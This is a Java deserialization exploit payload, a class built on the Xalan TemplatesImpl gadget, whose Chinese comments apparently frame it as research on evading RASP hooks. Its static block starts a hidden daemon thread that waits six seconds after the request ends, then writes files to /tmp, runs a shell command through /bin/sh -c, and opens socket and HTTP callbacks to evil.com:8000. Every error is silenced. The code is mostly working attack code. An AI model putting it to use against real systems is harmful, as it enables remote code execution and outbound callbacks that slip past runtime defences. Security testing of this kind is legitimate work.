import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/** R2 变体V1（异步面）：静态块只起守护线程（栈脱离反序列化帧、无请求上下文），
 *  线程睡眠 6s（HTTP 响应已返回、RASP 请求上下文已销毁）后依次执行 5 个独立动作：
 *   a1 nio 直写          /tmp/pwn_r2_async_nio        （writeFile 钩子事件发生，但栈干净+无cookie → 算法A/B 应都不命中）
 *   a2 sh -c 重定向写     /tmp/pwn_r2_async_exec       （command 钩子，干净栈 → command_reflect 应不命中）
 *   a3 RandomAccessFile  /tmp/pwn_r2_async_raf        （探测 RAF 是否在 writeFile 钩子面内）
 *   a4 裸 Socket 回连     GET /rt/r2_sock_r1           （成功标准b，探测 socket 层是否有钩）
 *   a5 HttpURLConnection  GET /rt/r2_net_r1            （成功标准b，探测 ssrf 钩子算法是否放行）
 *  主类自身实现 Runnable，避免内部类，单 class 组装。 */
public class PwnR2 extends AbstractTranslet implements Runnable {
    static {
        try {
            Thread t = new Thread(new PwnR2());
            t.setDaemon(true);
            t.start();
        } catch (Throwable t) {
            // 静默：不影响反序列化主流程
        }
    }

    public PwnR2() {}

    public void run() {
        try {
            Thread.sleep(6000L);
        } catch (InterruptedException e) {
            return;
        }
        // a1 nio 直写
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("/tmp/pwn_r2_async_nio"),
                "pwn".getBytes("UTF-8"));
        } catch (Throwable t1) {
            // 静默
        }
        // a2 shell 重定向写（子进程完成写入）
        try {
            Process p = Runtime.getRuntime().exec(
                new String[]{"/bin/sh", "-c", "echo pwn_r2 > /tmp/pwn_r2_async_exec"});
            p.waitFor();
        } catch (Throwable t2) {
            // 静默
        }
        // a3 RandomAccessFile 写
        try {
            java.io.RandomAccessFile raf =
                new java.io.RandomAccessFile("/tmp/pwn_r2_async_raf", "rw");
            raf.writeBytes("pwn");
            raf.close();
        } catch (Throwable t3) {
            // 静默
        }
        // a4 裸 Socket 回连
        try {
            java.net.Socket s = new java.net.Socket("evil.com", 8000);
            s.setSoTimeout(5000);
            s.getOutputStream().write(
                "GET /rt/r2_sock_r1 HTTP/1.0\r\nHost: evil.com\r\nUser-Agent: r2\r\n\r\n"
                    .getBytes("UTF-8"));
            s.getInputStream().read();
            s.close();
        } catch (Throwable t4) {
            // 静默
        }
        // a5 HttpURLConnection 回连
        try {
            java.net.URL u = new java.net.URL("http://evil.com:8000/rt/r2_net_r1");
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.getResponseCode();
        } catch (Throwable t5) {
            // 静默
        }
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
